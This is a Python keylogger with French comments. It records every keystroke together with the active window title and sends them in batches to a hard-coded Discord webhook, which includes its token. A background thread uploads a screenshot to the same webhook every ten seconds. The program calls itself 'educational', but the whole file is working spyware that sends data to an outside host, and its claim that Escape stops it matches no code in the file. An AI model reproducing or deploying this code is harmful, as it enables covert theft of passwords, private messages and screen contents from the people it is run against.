from pynput import keyboard
import requests
import win32gui
import threading
import time
import io
from PIL import ImageGrab

#webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1382688083371102238/r-Ev62eVZh4Ejn86NrBUkEVmQwtEBGZBMA42RMhyKy70VxCjgoCBfmrZcBTvdOtNNJqm"

buffer = ""

def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def envoyer_au_webhook(message):
    if not message:
        return
    try:
        requests.post(WEBHOOK_URL, json={"content": message})
    except Exception as e:
        print(f"Erreur d'envoi : {e}")

def envoyer_capture_ecran():
    while True:
        try:
            # Capture l'écran
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='PNG')
            buf.seek(0)
            files = {'file': ('screenshot.png', buf, 'image/png')}
            requests.post(WEBHOOK_URL, files=files)
        except Exception as e:
            print(f"Erreur capture écran : {e}")
        time.sleep(10)

def on_press(key):
    global buffer
    window_title = get_active_window_title()
    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"
        else:
            buffer += f"[{key.name}]"

    # Envoie toutes les 50 frappes
    if len(buffer) >= 50:
        envoyer_au_webhook(f"[{window_title}]\n{buffer}")
        buffer = ""

# Lance la capture d'écran en tâche de fond
threading.Thread(target=envoyer_capture_ecran, daemon=True).start()

# Lance l'écoute clavier
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger éducatif en cours... Appuie sur Échap pour arrêter.")
    listener.join()
